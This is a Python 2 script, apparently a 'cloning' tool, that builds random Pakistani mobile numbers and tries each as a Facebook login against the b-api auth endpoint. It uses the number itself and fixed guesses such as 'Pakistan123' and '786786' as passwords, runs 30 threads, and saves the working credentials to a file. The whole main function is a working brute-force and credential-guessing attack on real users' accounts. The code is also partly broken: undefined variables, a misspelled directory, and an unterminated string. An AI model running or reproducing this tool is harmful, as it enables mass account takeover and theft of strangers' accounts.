# XIDI #!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;94mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """


\033[1;94m██╗░░██╗██╗██████╗░██╗
\033[1;94m╚██╗██╔╝██║██╔══██╗██║
\033[1;94m░╚███╔╝░██║██║░░██║██║
\033[1;94m░██╔██╗░██║██║░░██║██║
\033[1;94m██╔╝╚██╗██║██████╔╝██║
\033[1;94m╚═╝░░╚═╝╚═╝╚═════╝░╚═╝



\033[1;94m██████╗░░░██╗██╗░█████╗░██╗░░██╗
\033[1;94m██╔══██╗░██╔╝██║██╔══██╗██║░██╔╝
\033[1;94m██████╦╝██╔╝░██║██║░░╚═╝█████═╝░
\033[1;94m██╔══██╗███████║██║░░██╗██╔═██╗░
\033[1;94m██████╦╝╚════██║╚█████╔╝██║░╚██╗
\033[1;94m╚═════╝░░░░░░╚═╝░╚════╝░╚═╝░░╚═╝








\033[1;94m██████████████████████████████
\033[1;94m███████████╣╣╣╣╣╣╣╣███████████
\033[1;94m█████████╣╣╣╣╣╣╣╣╣╣╣╣╣████████
\033[1;94m███████╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣███████
\033[1;94m██████╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣██████
\033[1;94m█████╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣█████
\033[1;94m████╣╣██╣╣██╣╣╣╣╣╣██╣╣██╣╣████
\033[1;94m███╣╣████████╣╣╣╣████████╣╣███
\033[1;94m██╣╣╣████████╣╣╣╣████████╣╣╣██
\033[1;94m██╣╣╣████████╣╣╣╣████████╣╣╣██
\033[1;94m██╣╣╣╣██████╣╣╣╣╣╣██████╣╣╣╣██
\033[1;94m█╣╣╣╣╣╣████╣╣╣╣╣╣╣╣████╣╣╣╣╣╣█
\033[1;94m█╣╣╣╣╣╣╣██╣╣╣╣╣╣╣╣╣╣██╣╣╣╣╣╣╣█
\033[1;94m█╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣█
\033[1;94m█╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣█
\033[1;94m█╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣█
\033[1;94m█╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣█
\033[1;94m█╣╣╣╣████████████████████╣╣╣╣█
\033[1;94m█╣╣╣╣█╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣█╣╣╣╣█
\033[1;94m█╣╣╣╣█╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣█╣╣╣╣█
\033[1;94m██╣╣╣██╣╣╣╣🆇🅸🅳🅸 🅑🅐🅲🅺 ╣╣╣██╣╣╣██
\033[1;94m██╣╣╣╣██╣╣╣╣╣╣╣╣╣╣╣╣╣╣██╣╣╣╣██
\033[1;94m███╣╣╣╣█╣╣╣╣╣╣╣╣╣╣╣╣╣╣█╣╣╣╣███
\033[1;94m████╣╣╣╣█╣╣╣╣╣╣╣╣╣╣╣╣█╣╣╣╣████
\033[1;94m████╣╣╣╣╣██╣╣╣╣╣╣╣╣██╣╣╣╣╣████
\033[1;94m█████╣╣╣╣╣╣██╣╣╣╣██╣╣╣╣╣╣█████
\033[1;94m███████╣╣╣╣╣╣████╣╣╣╣╣╣███████
\033[1;94m████████╣╣╣╣╣╣╣╣╣╣╣╣╣╣████████
\033[1;94m███████████╣╣╣╣╣╣╣╣███████████
\033[1;94m██████████████████████████████

"""

####Logo####

logo1 = """



\033[1;94m───────────────────────────────────
\033[1;94m─████████──████████─██████████████─
\033[1;94m─██▒▒▒▒██──██▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─
\033[1;94m─████▒▒██──██▒▒████─██▒▒██████▒▒██─
\033[1;94m───██▒▒▒▒██▒▒▒▒██───██▒▒██──██▒▒██─
\033[1;94m───████▒▒▒▒▒▒████───██▒▒██████▒▒██─
\033[1;94m─────██▒▒▒▒▒▒██─────██▒▒▒▒▒▒▒▒▒▒██─
\033[1;94m───████▒▒▒▒▒▒████───██▒▒██████████─
\033[1;94m───██▒▒▒▒██▒▒▒▒██───██▒▒██─────────
\033[1;94m─████▒▒██──██▒▒████─██▒▒██─────────
\033[1;94m─██▒▒▒▒██──██▒▒▒▒██─██▒▒██─────────
\033[1;94m─████████──████████─██████─────────
\033[1;94m───────────────────────────────────

\033[0;95m╭════════════════════════════════════════════╮
\033[1;94m║\033[0;91mAUTHOR : \033[0;92mXP_TEAM                     \033[0;91m      ║
\033[1;94m║\033[0;91mGITHUB :\033[0;92m XPXIDI  \033[0;91m     ║
\033[1;94m║\033[0;91mFACEBOOK :\033[0;92m REHMAT ALI \033[0;91m   ║
\033[0;95m╰════════════════════════════════════════════╯
"""
logo2 = """




\033[0;95m────────────────────────────────────────
\033[1;94m─██████████████────────██████──████████─
\033[0;95m─██▒▒▒▒▒▒▒▒▒▒██────────██▒▒██──██▒▒▒▒██─
\033[1;94m─██▒▒██████▒▒██────────██▒▒██──██▒▒████─
\033[0;95m─██▒▒██──██▒▒██────────██▒▒██──██▒▒██───
\033[1;94m─██▒▒██████▒▒██────────██▒▒██████▒▒██───
\033[0;95m─██▒▒▒▒▒▒▒▒▒▒██────────██▒▒▒▒▒▒▒▒▒▒██───
\033[1;94m─██▒▒██████▒▒██────────██▒▒██████▒▒██───
\033[0;95m─██▒▒██──██▒▒██────────██▒▒██──██▒▒██───
\033[1;94m─██▒▒██──██▒▒██─██████─██▒▒██──██▒▒████─
\033[0;95m─██▒▒██──██▒▒██─██▒▒██─██▒▒██──██▒▒▒▒██─
\033[1;94m─██████──██████─██████─██████──████████─



    
\033[1;94m________________________________BBBBBBBBBBBB
_______________________________BBBBBBBBBBBBB0
__BBBBBBBBB___________________BBBBBBBBBBBBBBB,
_BBBBBBBBBBBB________________BBBBBBBBBBBBBBBB0,
_BBBBBBBBBBBBB_______________BBBBBBBBBBBBBBBB0
BBBBBBBBBBBBBBBB____________BBBBBBBBBBBBBBBBB,
_BBBBBBBBBBBBBBBB___________BBBBBBBBBBBBBBBB0,
__BBBBBBBBBBBBBBBB_________BBBBBBBBBBBBBBBBB,
__BBBBBBBBBBBBBBBB_________BBBBBBBBBBBBBBBB,
___BBBBBBBBBBBBBBBB________BBBBBBBBBBBBBBB,
____BBBBBBBBBBBBBBB________BBBBBBBBBBBBBB0,
_____BBBBBBBBBBBBBB_______BBBBBBBBBBBBBB0,
______BBBBBBBBBBBBB_______BBBBBBBBBBBBBB,
_______BBBBBBBBBBBBB______BBBBBBBBBBBBB,
________BBBBBBBBBBBB______BBBBBBBBBB00,
__________BBBBBBBBBB______BBBBBBBBBBB,
___________BBBBBBBBBB_____BBBBBBBBBB0
____________BBBBBBBBB_____BBBBBBBBBB
______________BBBBBBB_____BBBBBBBB0
______________BBBBBBB_____BBBBBBBB
_______________BBBBBB_____BBBBBBB
________________BBBBBBBBBBBBBBBBB_
______________BBBBBBBBBBBBBBBBBBBBBB
____________BBBBBBBBBBBBBBBBBBBBBBBBBB_
__________BBBBBBBBBBBBB_________BBBBBBBB
_________BBBBB__BBBBB____________BBBBBBBBB
________BBB________B______________BBBBBBBBB
_______BBB_________B______________BBBBBBBBBB,
_______BBB______BB_B_BBB__________BBBBBBBBBB,
_______BBB_____BBB_B_BBBB________BBBBBBBBBBB,
_______BBB________000___________BBBBBBBBBBBB,
_______BBBB______00000_________BBBBBBBBBBBBB,
____00000BBBBBBBBB000BBBBBBBBBBBBBBBBBBBBBB00000000,
___0BBBB00BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB00BBBBBB0B0,
__0BBBBBB00BBBB00______B000000BBBBBBBBBB000B00BBBB0B0,
_0BBBBBBBB_BBBB00___B__BBBB000BBBBBBBBB00B0___B00000,
_00BBBBB____BBBB00BBBBBB000BBBBBBBBBBBB0,
__0BB_________B0B00000000BBBBBBBBBB0BB
________________00BBBBBBBBBBBB000000
_____________BBBBB0B00000000000BBBB_
___________BB0B00BBBBBB0__BBBBBBBBBBB,
__________BB_______BBBBB_BB0B00BB____BB,
__________0B________BBBB_BBB__________BB,
__________0BBBBBBBBBBBB__BBBBB_________B,
____________________________BBBB0BBBBBBB




  

  


\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mXIDI TOOL XP XIDI IS BACK ...
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
                                                

"""
CorrectUsername = "XP"
CorrectPassword = "XIDI"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;94m\x1b[1;91mTool Username \033[0;95m»» \033[1;94m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;94m \x1b[1;91mTool Password  \033[0;95m» \033[1;94m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:XIDI
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')



##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;94m[1]\033[0;95mSTART CLONING( \033[1;92m NOW)"
    time.sleep(0.05)
    print "\033[1;94m[2]\033[0;95mUPDATE (9.0)"
    time.sleep(0.05)
    print '\x1b[1;94m[0]\033[0;95m Exit ( Back)'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;94m")
    if peak =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\033[1;94m[1]  PAKISTAN TOOL'
    time.sleep(0.10)
    print '\033[1;94m[3] MORE INFO'
    time.sleep(0.10)
    print '\033[1;94m[5] CLONING ERROR'
    time.sleep(0.10)
    print '\x1b[1;94m[0] back'
   
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;94mOOSE:\033[0;95m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "Enter any Pakistan Mobile code Number"+'\n'
        print 'Enter any code 1 to 49'
        print 'Zong Ufone Moblink Telenor'
        try:
            c = raw_input("\033[1;94mmCHOOSE : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan ('\033[1;94m Total ids number: '+xxx)
    jalan ('\033[0;95mCode you choose: '+c)
    jalan ("\033[1;94mmWait A While Start Cracking...")
    jalan ("\033[0;95mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;94m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\033[1;94m[OK✓]  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[0;95m[cp+] ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\033[1;94m[OK✓]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[0;95m[cp+] ' + k + c + user + '  |  ' + pass2
                            cps = open('sae/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="Pakistan123"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\033[1;94m[OK✓]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[0;95m[cp+] ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="PUKHTOON"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\033[1;94m[OK✓]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[0;95m[cp+] ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="786786"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\033[1;94m[OK✓]  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[0;95m[cp+] ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;94m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 10 to 20 days")
    print ''
    print """
    ███
────▓▓▓▓───▓▓▓▓▓▓▓▓▓▓▓───▓​▓▓▓
──▓▓▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓​▒▒▒▓▓
──▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓​▓▒▒▓▓
───▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓​▓▓▓▓
─────▓▓▓▓▓███▓▓▓▓▓▓▓███▓▓▓​▓▓
────▓▓▓▓▓▓███▓▓▓▓▓▓▓███▓▓▓​▓▓▓
────▓▓▓▓▓▓▓▓▒▒▒███▒▒▒▓▓▓▓▓​▓▓▓
────▓▓▓▓▓▓▓▒▒▒▒███▒▒▒▒▓▓▓▓​▓▓▓
─────▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓​▓▓
───────▓▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓▓▓▓
─────▓▓▓░░░░░▓▓▓▓▓▓▓░░░░░▓​▓▓
─▓▓▓▓░░░░░░░░░░░▓░░░░░░░░░​░░▓▓▓▓
▓▓▓▓▓░░░░░╔══╦╦╦═╦═╦╦╦═╗░░​░░▓▓▓▓▓
▓▓▓▓▓▓░░░░╚╗╔╣╩║╬║║║═╣═╣░░​░▓▓▓▓▓▓
▓▓▓▓▓▓▓░░░░║║║╦║║║║║║╠═║░░​▓▓▓▓▓▓▓
▓▓▓▓▓▓▓░░░░╚╝╚╩╩╩╩╩╩╩╩═╝░░​▓▓▓▓▓▓▓
─▓▓▓▓▓▓░░░░░░▄██▄██▄░░░░░░▓​▓▓▓▓▓
───▓▓▓▓░░░░░░███████░░░░░░▓​▓▓▓
─────▓▓█▓░░░░███████░░░░▓█​▓▓
──▓▓▓▓▓▓▓▓▓░░░█████░░░▓▓▓▓​▓▓▓▓▓
─▓▓▒▒▒▒▒▒▓▓▓░░░███░░░▓▓▓▒▒​▒▒▒▒▓▓
▓▓▒▒▒▒▒▒▒▒▒▓▓▓░░▀░░▓▓▓▒▒▒▒​▒▒▒▒▒▓▓
▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓░▓▓▓▓▒▒▒​▒▒▒▒▒▒▒▓▓
▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒​▒▒​▒▒▒▓▓
▓▓▓▒▒▒▒▒▒▒▒▓▓▓─────▓▓▓▒▒▒▒​▒▒​▒▒▓▓▓
─▓▓▓▓▓▓▓▓▓▓▓▓───────▓▓▓▓▓▓​▓▓▓▓▓▓




\033[1;94mTHANKS FOR USING TOOL
\033[1;94mFb\033[0;95mRehmat Ali
\033[1;94myoutube\033[0;95mXP TRICKER

    
    raw_input("\n\033[1;94m[\033[1;94mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()

